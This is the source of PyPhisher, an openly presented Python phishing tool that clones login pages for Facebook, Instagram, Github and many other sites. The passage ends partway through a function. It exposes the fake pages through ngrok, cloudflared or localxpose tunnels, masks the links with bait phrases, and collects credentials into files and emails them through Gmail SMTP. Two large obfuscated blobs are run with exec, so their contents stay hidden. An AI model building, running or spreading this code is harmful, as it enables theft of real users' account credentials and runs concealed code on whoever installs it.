# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 2.0
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing
# Env        : #!/usr/bin/env python

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |{" "*19}       {cyan}[v{version}]
{cyan}        |___/  {" "*11}      {red}[By KasRoudra]
"""

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]


try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

# Get Columns of Screen
columns = get_terminal_size().columns

websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 

# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
sites_dir = f"{home}/.websites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
default_port = 8080
default_tunneler = "Cloudflared"
default_template = "60"
nr_command = f"{tunneler_dir}/ngrok"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    nr_command = f"termux-chroot {nr_command}"
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"
    


print(f"\n{info}Please wait!{nc}")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'====QVTXLQG6B77763PHL26G52RSNTGNN7E7WUSFWTLVIYZ6FAEYSDYALHUWRCY6R33HSG4R25AJAZQCCUJX6RTD4WMVXXHY43MGDTYOBC4N223GRZBFCURGR2W7SAAN3ACC5XKIIBL2QRJR7JBWAB7CZ2SCXYOZCECQ5VI3MH2YF5L7EVLCQYGGAVHQYXECEU3NN3M2BYCP4JB6V5ZSS3TM6K56MTLPCJBX3GDKX6ZW7J5CW4C5TYTACHOUSO4TT66FY57XCQXBQRZ542CSM7G36SWAVIRSNW3SWPNNWJRIXNEZDUTNLKVPQIUQMANHVVATH7TOWZ7ZWAAKQKPBJEDQXUETP6PAT63YWEF5IPD7ILAYQ4TAPBEOEAJYUJS3J25PNUKAU4MEUHAAUIL2WQZQKQ5N76KPC5F46RPEM7JGNISGYKASWE2GO4QTERZBGYO4JCIZY5VCJNPA2P6YGUCOYZCQNWLYQREQFQOTD76I27GFV5EHQIOOM4S6JEF4AHI54BCB6OQTID4TSCIZHBFIABPFDFDYZ7FQEFWGILKNDY6YSBLWK3DTPVELNI6M44ANV6HVZKIGMQ2OHPXWMEOCAJU6JD4ZEGU3RMJMZUMFAJHHP2GNNLEAJLOXIDA5J72KLVWZQYBOYADDRSGABZWATIKKUGJ47H2KEHQYLCW7C3N2GFUXQY2OU6N6WWKC2XPISDLIJZOAI5C7JYCIO7YS56RCQQXHHDLCXO4KLSKWWHYA3MKC55UZT6YBTQCOQ2RY2LLKENRHOHQJY5MRDV2LXE23G5IF54LRQWV2KXP2LQID65R5RMH6KYJTHFEK5J64UKRMP4NLT25PIE3AQAICTZTEZ2XRSZM7U7ODGWA6GD35MZ4UADFQA3AYLMP2RKMJSBNP6GV2TKOHCWN6M5WOIO6QWMNY25DF5OHUG73KPEWSPG7O4Y3SWKYZUIMROBJOAUBQ7NX5F5V35ITDII3LNDFKIQOJEHUW3AW3MQY5BZS5JFDMIYMNOLGJR75R2NB2T25XAOARA22CI4GTCL75CYJX4OLGZ7K3BSXR6STDQYHTTKX5OGIBSSSELJ75KLJHN6AG3ZFPFQFZFU7MEYPCYLTI6W6GPCJS7CN647XAML5T23KTBXQOGMRCEBX3UXMCESOMBHZRNH7BN7SLKSIX3BOPFGLDDFC5GBFXN4G3K5AF2Z5NNA2VMAB3WZWGASXC3P5EHVZX72J7WDWEX3RHYYBXHU5L62UZLBL4KECKV34BNRENJJGHW2DFHWZ56Q6WSJOJPXSXZXG4GEY2HVGRES6FYMAT6BQGDQQMF7KKKUCQNQSDAZV2A2DONIX6SNPUYHKGHNUT2SVUQSJNLH3XBFAL2D4Q2ILIPPW7DVBZWORRU5P2WUH45LA5KX34EICPS4FBTPKDOGAYM7LEUCCO5AGZEUXZD7OCUDTBBEZBN4KQT6MXOOGM4ARNQ6LXRQLYZYYG5BOCQKBMNLGSRTCI5F2D5R35VBZ3Q3Y3ZBH5UA4RWM6KKZCFMEFJ2JA3B7RTKGJEBXSZ44GXD2K53OHCHRXVAFECFZFC3BRAGGAWHEQ4ZKXFMQYMGDKKOMBE5FHZAXDDC2AK3YXJ742KNM72IOESVRH6OAB2DFBUDGUTKBVMXM6C7RKNG3UOL4GUYB6GW74LV46MH5E7MDLPRZNCVBEBJM3WTO5Z6RCC5KLPK773LQFGAIRYHSUQXEW5TO4BDEJUHYNFH4H4KFU44WLD2PWIMT5AARPPH5E2372JRXGNEAMO6SMWWQ6E3EUXDJJGQPKMSEYLWLRYAYUJLB6GQYTMD3P37LCEUIY4RARCMKUFBVC35VEYT42O3HTI6VKEGK2QPYXPGGSMHAQ7XIEYCYFIT3IIP5D7IOQIUAMZCTNSAJO5KBB532F7AQKU5D5UDEWOLNKCSNJHAZ2TIJBSH2RKNREHAQEK3XRYMARD46RFMGTI26UZFEBQ44SG65NOK7A4V65CSRFVUAFFRAIITEMT74DQGG74NPPEYCKQHEINELZ4CK2PPXMRZEF7D7VXBCOFOVBHYWZRVWLZAKRNRGURMLE3ERK7KCHNFLMQ2JUICMQMSTY4W7B56FP7P5ZZCFGJYR6X6QGBJO5L4TBG3XXK54YTKM7ARXQBBODM27RWWJOIJBSXHXOEUXZLCYE6CPTK5JD6VD4NQL7EEH4LYUOF2KC2BRBM7C3OBKYG2XQJY3UQB23D3REF2BHSDFMN3N5G7BCNDYOV575ADS5OX7VSDPGBMYFQONUOUKV22SJZWNW4AU7ML2JE4ZJ3WIWZZOHELWI7AKBAD2ZP255RZ5XNK4CYI7YRKP7EB4S6QTJBY2GFMLKELJCMSAHQRDOUEOWMCURPSO35HKJ3BDJZHXHV3MXXOADOHT2CQU7PTNY4E6F53BTUWCCCA2UINFZTL2X4PPPZPKKZOFF2XLEXGLU7MD5WVMPKPDTQCZR4N3FN33C6MN7E5RULMHYITHCQLCKMIY4OJEW2SQBLHGNT76UY6OYETDIGSTVH5JNNI4SLRARM7L64NAMLOCNF5VB6BWOCH6XQ2UYQEYKIWXGTYFIWPES3EIPBHRAFTKPS6EZRM5OSDJU45QCFJSMTZ5F33WJYR753UBILIDNXO22SJJI2CNL2NYVTE2L2G6Y36475DR37YEYYWVYAFAQYEAGIGVYGLDRI7LRPNHFB7HY367KZJAHCCD3OG47NOTPJZYJOSR6Z7L6F7SE4ZEVP3IRCJPAEDU5VVNPANHWJOHFHNP2VZAYYYKJ2SPH4LZYSYYVYWLCOQCDJ7FJADD25TJ5Y4WETFPLVEANCACKW7IZJ3YAXRHZG2LFO7KWCT26DZ6V6UK45PDMR6KF3DZTEH7MDIYYIKJVOC5S64MMIWHV3HBSSETQJ7JTPS4FYUVTQMMGISCW6NISLWMFOAUPVOIHSLAPKW4Y4VWYHA7OBFLAYJGEJPXOGPOLIBWJQRCWIJIG45T5L46UXTS4LCYI3JYXQFXC2CXL6W6UARAX523VCCONOGUTQGY5EAOXT6S6Z4IJY6VHMAT7QZLTJNPWBHP5G3DPTYMM57GERYVSFEOBHZELESV4SZMUYFGDRVUGRBH55YYNQ7SIMNGLNSCGSYRFBOCA66GRC2USRNJ4FKQWLTQEGL74OPKT4RLRZLCS3E4N5HCZAAUXWPQAKURKH6E3UXOQEQ6SIKH22G2BXXWTP6226IAWXGJA4DJ5DENPPWYXEQYFR47W5RWK2SVG3K6YM4VO5XZ2OOOIACJUFHQOKL2E2HV2XY2VF64S57MTQHV542HUZR3SRJSPWXK5K6Z5LLYD6X7ZXCJYF676LBDV4M4GHRJNLUKETV65XTDB4JGZB667SKXP6D54Z3BYLDIL6WXSPNXWE6XR3G7IRJFGD64RSCD4OJBY2OWM3M26DRU6RT3CK37WNOBOVH6D5VE6GQRE6EPLAUCE26AC7LEPGTQKTPKS6IZOPHIICXWAFULNIRQ3XPLFM3QWO7EY5TWXLKW3RCKS4X5JXXPPLEAOKDCC5HZSVPOOAOE4X7KYVPJFWLNSHLD3XHXBXNPTD27KKTYD6AAJAGGIML7K4DVV7K7CIZP7HFEXXPUG7ST6MULS5ZM6WYVZ76G5B4JKT6S57KUYZBCIW65S4ITYJTMKLSFBWZKASCQIJ6UNZMXBRLVM46VZNF7DBHUE6UWYR3PQP5Z6ZVZ3A5PEF6T6TLQISPCXRU2STO6LUAAS3GJRNPIEH2TSZNIZPE2WPAKN2R63TJ2ABXHPYN73CB4X2XR7UCIAG4B3OR6KPZ464OEDLFT3XFSEVTGHKCRJYPJ3SBG4VJGJUQO7MIH7NCNWI4JU4MLFKLAH6UWGMLQLXMRYJPO5NTHNI6OVXBFAN5F3L7UA5H5O6DURTNVE52LXPM5RILTLEKUONOG6DRLJHZADP665XI6VHQYJWB5OKJQMLS7G76YVUV57QGQ5XKON2HNNET4ATNHLW4L7HP7FX3FBUG3NVA5A4O3ORXWEBZECAUB63YOU56X575U5KCFRIDZ27QZRJO2N5CS3IYG3VIVOF3QS6MCXKGF5F5JAO4EZRK2YCF5TBPCXA2KTXOWIOPZWK2W4EOTUIC6QQ6632AN62M5HCK46YSPHZVNX3OC6PR3B2ZNH4LPUSLDN7PLR5O2SW666OT7GPRXSO7QZLDWA34X2W4EPNH622HRNC6WV6MQHVM4QYPXUAXLBUSJXAXNYIVWWKORJE37FQN7MKR3CL2GJ4ODGV3YRH3TCE35W67QRQ35K22F5737YLB74OI47NHNEEAFKGP7QF7RU6OJSRE732ELMXGUFIUJDMAOYQ4CRMPPRL73CAVDXTLNA7TY5QRTH2Y7YJDWRXBVYGJG74TRC7GFJL3GL6R2TMTJSMVOU3F46XSSWXSOH5C3UWHJ5RI5LFHFMOXCBM2BUL5LNVH27ZM3D5MRIHOK4RJKVXYSUZQ3RNQQCVO5TR3TDE3ZN6CHER7W73WK5B5ZXZLFFM54PWFAOJZIJKWOHW6YLE5RDZNMNSCFWAHXVHZ5PBXCHTWZ5LPCGCLX43PX26DRN35ZLXTD3JA77LVSWQZVLGHUUDWCU33SAGNHT2HNR7Y4EMKHGRVMWCTCWDNW5YKT7RBJTSP4MKVDY5MVD35FHMKLB5GIZQ6KGJHNMT75HAX2G35NT3KCVBQBFTWKK2NJ6IH33ZN3WHVT3MZLMCC7P32ZRXMV7NGWH7C62YZISLEPK2V3CXXP2WKERQ4WAOIOSDLXZHKJYXYE5XDUGHDB6G5DZOO6M46HHUC75CJVBVZ35SAWLHGLLB37FHGC3IKK6KNMT7XW7QTS6T63K55KN5UMRJH77TCZIQU6UZ7WRKTGW3H7EOR6Z22X6N4CKXSWXHVLZFFPDZP7S54T4IVZUPXNB2DCJVJIG4DHF54YG6QGG4MSRWT3HYLB6WJWVGUVR54DHBDEJHZ7KNNU2SYJRFDZGMDDPVHS6LZSIH7VW7TCO5JY4VOLJWWXCMGOPT4WCD32H55Y4TQHRYXC6XNPGOQ2PLW5TGMRDNS6JUNQURB36Q3LWRKI57ZRU5JA356X3PTYYPTU66WXLBJI544YY56MWTRLLDMZXZZ4GY6644NWOKTLV56FSKKVLYAOVFWUQT6IDBLTNEDW7JJKKFUU2N562OY6B2VH4RHJG7YEXPT5VCLXPUK6W5HJRNOKMH5SIG24TVMYODK3QH76DVWC3WQGZYB7Y56RUQ3FR3PPRLZX5BCW5UXR3JK3IM634HVDNKUKLJCTKMHYH3YYGLBZOGMZZQA4ZTZN77VHX66777XP5VP74XP77PV2VK5QTYGEQ7GYD3H3H5YBZXCEQMCR7Z4RYTYGFMFOL46J6REEFMDT3NJ2FLBOCP'))


# Print lines slowly
def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)
        
# Prints colorful texts
def lolcat(text):
    if is_installed("lolcat"):
        run(["lolcat"], input=text, text=True)
    else:
        print(text)

# Center text 
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)


# Print decorated file content
def show_file_data(file):
    lines = cat(file).splitlines()
    for line in lines:
        print(f"{cyan}[{green}*{cyan}] {yellow}{line}")

        
# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman", "yay"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman=="apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("ngrok"):
            shell("brew install ngrok/ngrok/ngrok")
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


# Internet Checker
def internet2(host="8.8.8.8", port=53, timeout=10):
    while True:
        try:
            if not update:
                break
            setdefaulttimeout(timeout)
            socket(inet, stream).connect((host, port))
            break
        except Exception as e:
            print(f"\n{error}No internet!\007")
            sleep(2)

def internet():
    connection = HTTPSConnection("8.8.8.8", timeout=5)
    while True:
        try:
            if not update:
                connection.close()
                break
            connection.request("HEAD", "/")
            break
        except:
            print(f"{error}No internet!\n\007")
            sleep(2)
        finally:
            connection.close()

        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: PyPhisher Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")



# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Dowbload files with progress bar(if necessary)
def download(url, path, size=None):
    from time import ctime, time
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
    for i in range(retry):
        try:
            with open(path, "wb") as file:
                internet()
                response = session.get(url, stream=True, timeout=20)
                chunk_size = 4096 #KB
                total_length = response.headers.get('content-length')
                length = int(total_length or size or "0")
                downloaded = 0
                alldata = b""
                max_len = columns - 38
                newname_space = " " * (14 - len(newname))
                max_len2 = columns - 50
                pre_space = 0
                suf_space = max_len2
                stime = time()
                for data in response.iter_content(chunk_size=chunk_size):
                    etime = time()
                    downloaded += len(data)
                    alldata += data
                    speed = chunk_size/float(etime-stime)
                    readable_speed = readable(speed, is_speed=True)
                    file.write(data)
                    readable_size = readable(len(alldata))
                    if length == 0:
                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
                        stdout.flush()
                        if pre_space == max_len2:
                            forward = False
                        if suf_space == max_len2:
                            forward = True
                        if forward:
                            pre_space+=1
                            suf_space-=1
                        else:
                            pre_space-=1
                            suf_space+=1
                    else:
                        done = int(max_len * downloaded / length)
                        # Arrow will progress as the data increases with done
                        arrow = "=" * done
                        # Space will decrease as done increases
                        arrow_space = " " * (max_len - done)
                        percentage = round(downloaded * 100 / length, 2)
                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
                        stdout.flush()
                    stime = time()
                if length == 0:
                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
                else:
                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
                stdout.flush()
                # This print fixes the cursor to newline
                print()
                break
        except Exception as e:
            print()
            remove(path)
            append(e, error_file)
            print(f"{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()


# Extract zip/tar/tgz files
def extract(file, extract_path='.'):
    directory = dirname(extract_path)
    if directory!="" and not isdir(directory):
        mkdir(directory)
    try:
        if ".zip" in file:
            with ZipFile(file, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(file)
                    exit()
            return
        tar = taropen(file, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        


def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
    sed("redirectUrl", url, f"{site_dir}/login.php")


# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Website chooser
def show_options(sites):
    total_sites = len(sites)
    def optioner(index, max_len):
        # Avoid RangeError/IndexError
        if index >= total_sites:
            return ""
        # Add 0 before single digit number
        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
        # To fullfill max length of a part we append empty space
        space = " " * (max_len - len(sites[index]))
        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
    # Array index starts from 0
    first_index = 0
    # Three columns
    one_third = int(total_sites/3)
    # If there is modulus, that means some entries are remaining, we need an extra row
    if total_sites%3 > 0:
        one_third += 1
    options = "\n\n"
    # First index of last line should be less than one-third of total
    while first_index < one_third and total_sites > 10:
        second_index = first_index + one_third
        third_index = second_index + one_third
        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
        first_index += 1
    if total_sites < 10:
        for i in range(total_sites):
            options += optioner(i, 20) + "\n"
    options += "\n"
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
    else:
        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
    lolcat(options)



# Set up ngrok authtoken to work with ngrok links
def nr_token():
    global nr_command
    while True:
        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
             break
        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/N/help]: {green}")
        if has_token == "y":
            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
            shell(f"{nr_command} config add-authtoken {token}")
            sleep(1)
            break
        elif has_token == "help":
            sprint(nr_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

# Set up ngrok authtoken to work with ngrok links
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} account login")
            break
        elif has_token == "help":
            sprint(lx_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

def ssh_key():
    if key and not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Press enter three times for ssh key generation{nc}\n")
        sleep(1)
        shell("ssh-keygen")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)


# Output urls
def url_manager(url, arg1, arg2):
    global mask
    print(f"\n{info2}{arg1} > {yellow}{url}")
    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)

    
# Copy website files from custom location
def customfol():
    global mask
    while True:
        fol = input(f"\n{ask}Enter the directory > {green}")
        if isdir(fol):
            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
                # Remove slash and spaces from mask
                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
                copy(fol, site_dir)
